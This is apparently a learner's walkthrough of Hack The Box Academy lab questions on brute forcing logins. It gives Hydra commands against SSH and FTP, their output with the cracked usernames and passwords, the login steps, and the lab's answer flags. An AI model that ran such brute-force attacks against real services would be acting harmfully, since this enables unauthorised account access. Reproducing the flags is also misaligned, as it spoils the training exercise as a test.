# Service Authentication Brute Forcing


# Questions
```
_Question:_
Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above. Then try to SSH into the server. You should find a flag in the home dir. What is the content of the flag?


hydra -L bill.txt -P william.txt -u -f ssh://159.65.80.159:31129 -t 4

Result:

terrified@penguin:~/Desktop/2021/hackthebox-academy/login-brute-forcing/wordlists$ hydra -L bill.txt -P william.txt -u -f ssh://159.65.80.159:31129 -t 4
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-27 15:34:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
[DATA] attacking ssh://159.65.80.159:31129/
[STATUS] 26.00 tries/min, 26 tries in 00:01h, 157090 to do in 100:42h, 4 active
[ERROR] ssh target does not support password auth
[STATUS] 17.67 tries/min, 53 tries in 00:03h, 157063 to do in 148:11h, 4 active
[ERROR] ssh target does not support password auth
[31129][ssh] host: 159.65.80.159   login: b.gates   password: 4dn1l3M!$
[STATUS] attack finished for 159.65.80.159 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-27 15:39:28

Command to SHH into machine:
ssh b.gates@159.65.80.159 -p 31129

To see flag:
vim flag.txt

Answer:
HTB{n3v3r_u53_c0mm0n_p455w0rd5!}

```


```
Question:

Once you ssh in, try brute forcing the FTP login for the other user. You should find another flag in their home directory. What is the flag?

Command:
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

Result:

.gates@bruteforcing-2-198273-6db6c447f9-cg6hl:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-27 05:11:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/
[21][ftp] host: 127.0.0.1   login: m.gates   password: computer
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-27 05:11:36

Command:
ftp 127.0.0.1

Command to switch user:
su - m.gates

Answer:
HTB{1_4m_@_bru73_f0rc1n6_m4573r}


```
